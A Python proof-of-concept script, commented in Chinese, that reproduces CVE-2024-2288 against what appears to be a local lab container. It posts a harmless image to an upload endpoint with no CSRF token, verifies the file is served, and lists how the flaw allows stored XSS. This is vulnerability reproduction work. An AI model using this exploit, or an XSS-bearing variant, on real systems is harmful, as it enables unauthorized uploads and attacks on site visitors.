#!/usr/bin/env python3
"""
CVE-2024-2288 CSRF 漏洞演示脚本
直接在容器内执行,绕过网络隔离问题
"""
import requests
from io import BytesIO
from PIL import Image

print("=" * 60)
print("CVE-2024-2288 CSRF 漏洞演示")
print("=" * 60)

# 目标地址(容器内的 localhost)
TARGET = "http://127.0.0.1:9600"

# 步骤 1: 检查服务器
print("\n[步骤 1] 检查服务器状态...")
try:
    resp = requests.get(f"{TARGET}/")
    print(f"✅ 服务器响应: {resp.status_code}")
    print(f"   响应内容: {resp.text}")
except Exception as e:
    print(f"❌ 服务器无法访问: {e}")
    exit(1)

# 步骤 2: 构造 CSRF 攻击
print("\n[步骤 2] 构造并发送 CSRF 请求...")
try:
    # 创建一个简单的图片
    img = Image.new('RGB', (100, 100), color='red')
    img_bytes = BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    
    # 发送 POST 请求(模拟 CSRF 攻击)
    files = {'avatar': ('csrf_attack.png', img_bytes, 'image/png')}
    resp = requests.post(f"{TARGET}/upload_avatar", files=files)
    
    print(f"✅ CSRF 请求成功: {resp.status_code}")
    print(f"   服务器响应: {resp.json()}")
    
    uploaded_file = resp.json().get('message', '').split(': ')[1] if resp.json().get('message') else 'csrf_attack.png'
    
except Exception as e:
    print(f"❌ CSRF 请求失败: {e}")
    exit(1)

# 步骤 3: 验证文件上传
print("\n[步骤 3] 验证文件已上传...")
try:
    resp = requests.get(f"{TARGET}/user_infos/{uploaded_file}")
    print(f"✅ 文件可访问: {resp.status_code}")
    print(f"   内容类型: {resp.headers.get('content-type')}")
    print(f"   文件大小: {len(resp.content)} bytes")
except Exception as e:
    print(f"❌ 文件验证失败: {e}")

# 步骤 4: 演示漏洞影响
print("\n[步骤 4] 漏洞影响分析...")
print("🔥 漏洞确认:")
print("   1. POST /upload_avatar 端点未验证 CSRF Token")
print("   2. 未检查 Origin/Referer 头")
print("   3. 攻击者可通过恶意页面远程上传文件")
print("   4. 可上传包含 XSS 代码的 HTML 文件")
print("   5. 受害者访问时触发存储型 XSS")

print("\n" + "=" * 60)
print("✅ CVE-2024-2288 漏洞复现成功!")
print("=" * 60)
